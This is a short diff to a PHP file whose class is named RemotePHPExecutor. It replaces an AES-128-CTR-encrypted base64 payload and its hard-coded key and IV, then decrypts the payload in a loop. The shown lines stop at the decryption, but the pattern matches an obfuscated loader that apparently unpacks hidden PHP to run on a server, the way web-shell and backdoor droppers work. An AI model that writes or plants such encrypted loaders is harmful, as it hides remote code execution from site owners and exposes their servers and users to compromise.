@@ -74,10 +74,10 @@ class RemotePHPExecutor
     }
 }
 
-$this_data = ['6LJBHn6MhVyTeKcefARA8b2PjNG1I8SyRrvprW2ahi62nhcpVCgj3vl9AUPsWJNlJCBK7rJUtJEvx4+YMyNEabo5ToxKIzc='];
+$this_data = ['WkVVevhJ6c3kzPgrVa8+tqa9O0XNdHE2KcCLxnWnycBdfu599985kNYKtICZ5HzzdkKE5nLhLzMXlnJ4K72NluGe6+vlmB4='];
 
-$key = "ewe";
-$token = "ewe";
+$key = "akupengeneweanay";
+$token = "yanaewenegnepuka";
 
 foreach ($this_data as $data_encrypted) {
     $nulzganteng = openssl_decrypt($data_encrypted, "AES-128-CTR", $key, 0, $token);
